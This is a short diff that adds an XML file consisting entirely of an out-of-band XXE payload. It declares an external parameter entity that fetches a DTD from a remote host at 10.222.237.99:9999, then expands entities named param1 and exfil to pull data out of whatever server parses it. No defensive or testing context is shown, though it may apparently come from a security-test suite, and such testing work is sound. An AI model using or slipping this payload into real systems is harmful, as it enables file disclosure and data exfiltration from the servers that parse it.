@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ENTITY % sp SYSTEM "http://10.222.237.99:9999/payload.dtd">
+%sp;
+%param1;
+%exfil;
+]>
